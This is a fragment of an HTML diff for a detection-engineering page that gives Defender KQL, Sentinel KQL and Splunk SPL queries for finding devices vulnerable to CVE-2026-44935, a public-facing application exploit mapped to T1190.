+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+    </button>
+  </summary>
+  <div class="uc-body">
+    <div class="uc-desc">Match vulnerability scanner output to the CVE(s) named in the article.</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Vulnerabilities</span> <span class="ind">DeviceInfo</span> <span class="ind">DeviceTvmSoftwareVulnerabilities</span></div>
+    
+    <div class="tabs">
+      <button class="tab-btn active" data-target="art-167-uc2-kql">Defender KQL</button>
+      <button class="tab-btn" data-target="art-167-uc2-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-167-uc2-spl">Splunk SPL (CIM)</button>
+    </div>
+    <div class="tab-content active" id="art-167-uc2-kql"><pre><button class="copy-btn">COPY</button><code>// TVM tables are daily snapshots — pin a 1-day window so the engine
+// partitions on Timestamp instead of scanning the full retention.
+DeviceTvmSoftwareVulnerabilities
+| where Timestamp &gt; ago(1d)
+| where CveId in~ (&quot;CVE-2026-44935&quot;)
+| join kind=inner (DeviceInfo | where Timestamp &gt; ago(1d)) on DeviceId
+| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
+| order by VulnerabilitySeverityLevel asc, DeviceName asc
+</code></pre></div>
+    <div class="tab-content" id="art-167-uc2-sentinel"><pre><button class="copy-btn">COPY</button><code>// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
+// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
+// no Sentinel translation — track via Update / Heartbeat OS-version
+// gaps as a coarse approximation.
+DeviceTvmSoftwareVulnerabilities
+| where TimeGenerated &gt; ago(1d)
+| where CveId in~ (&quot;CVE-2026-44935&quot;)
+| join kind=inner (DeviceInfo | where TimeGenerated &gt; ago(1d)) on DeviceId
+| project DeviceName, OSPlatform, CveId,
+          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
+| order by VulnerabilitySeverityLevel asc, DeviceName asc
+</code></pre></div>
+    <div class="tab-content" id="art-167-uc2-spl"><span class="splunk-cat-pill splunk-cat-application" title="Splunk-research detection category">APPLICATION</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-167-uc2-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-167-uc2-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-167-uc2-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
+    from datamodel=Vulnerabilities
+    where Vulnerabilities.signature IN (&quot;CVE-2026-44935&quot;)
+    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
+| `drop_dm_object_name(Vulnerabilities)`
+| sort - severity</code></pre><pre class="spl-mode-body" id="art-167-uc2-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
+    from datamodel=Vulnerabilities
+    where Vulnerabilities.signature IN (&quot;CVE-2026-44935&quot;)
     by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
 | `drop_dm_object_name(Vulnerabilities)`
 | sort - severity</code></pre></div></div>
